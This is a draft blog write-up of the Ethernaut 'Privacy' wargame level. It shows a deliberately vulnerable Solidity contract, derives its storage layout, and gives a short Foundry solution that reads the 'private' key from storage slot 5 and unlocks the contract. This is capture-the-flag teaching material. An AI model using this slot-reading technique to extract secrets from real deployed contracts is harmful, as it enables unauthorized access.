######################
Ethernaut 12: Privacy
######################
:date: 2023-08-13
:status: draft
:slug: ethernaut-12-privacy
:summary: In the internet, ``private`` never means what you expect.
:tags: programming
:author: capu
:featured_image:

Objective
=========
Unlock the contract. Guess the key which passed to ``unlock`` manages
to not revert on line 13

Code
====
.. code-block:: solidity
    :linenos: inline
    :hl_lines: 7 13

    contract Privacy {
        bool public locked = true;
        uint256 public ID = block.timestamp;
        uint8 private flattening = 10;
        uint8 private denomination = 255;
        uint16 private awkwardness = uint16(block.timestamp);
        bytes32[3] private data;

        constructor(bytes32[3] memory _data) {
            data = _data;
        }
    function unlock(bytes16 _key) public {
            require(_key == bytes16(data[2]));
            locked = false;
        }
    }

Solution
========
The trick with this one seems to be

- to figure out where a particular piece of information will end up in
  contract storage
- and then how will the ``_key`` parameter will be padded in the cast.

Due to how the state is packed, the storage should look like so

.. code-block:: solidity

    // slot 0
    bool public locked = true; 
    // slot 1
    uint256 public ID = block.timestamp; 
    // slot 2
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp); 
    // slot 3
    bytes32[3] private data;
    // slot 6

... why am I doing this manually?

.. code-block:: fish

    [I] capu ~/s/ethernaut-solutions (master)> forge inspect --pretty  src/levels/12-Privacy.sol:Privacy storageLayout
    | Name         | Type       | Slot | Offset | Bytes | Contract                          |
    |--------------|------------|------|--------|-------|-----------------------------------|
    | locked       | bool       | 0    | 0      | 1     | src/levels/12-Privacy.sol:Privacy |
    | ID           | uint256    | 1    | 0      | 32    | src/levels/12-Privacy.sol:Privacy |
    | flattening   | uint8      | 2    | 0      | 1     | src/levels/12-Privacy.sol:Privacy |
    | denomination | uint8      | 2    | 1      | 1     | src/levels/12-Privacy.sol:Privacy |
    | awkwardness  | uint16     | 2    | 2      | 2     | src/levels/12-Privacy.sol:Privacy |
    | data         | bytes32[3] | 3    | 0      | 96    | src/levels/12-Privacy.sol:Privacy |

``data`` starts at slot 3, and since it's an array of word-length elements,
element with index 2 will be stored on slot 5. And I can read it with foundry's
cheatcodes like so:

.. code-block:: solidity

    vm.load(address(target), bytes32(uint256(5)))

Remember we first used it in `challenge 8 <{filename}/2023-07-17-ethernaut-2.rst>`_
However, in line 13, the value is cast to a bytes16:

.. code-block:: solidity

    require(_key == bytes16(data[2]));

so I gotta figure out if it's the lower or higher 16 bytes that'll remain:

.. code-block:: fish

    [N] capu ~/s/ethernaut-solutions (master)> chisel
    Welcome to Chisel! Type `!help` to show available commands.
    ➜ bytes32 big =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
    bytes16 small = bytes16(big);

    ➜ small
    Type: bytes16
    └ Data: 0xffffffffffffffffffffffffffffffff

The lower (most significat) bits survive the cast.

Although when implementing it in Solidity I can abstract that away and just do
the same cast 🙃 

.. code-block:: solidity

    function solution(address payable target_) internal override{
        Privacy target = Privacy(target_);
        bytes32 keyWord = vm.load(address(target), bytes32(uint256(5)));
        target.unlock(bytes16(keyWord));
    }

😎
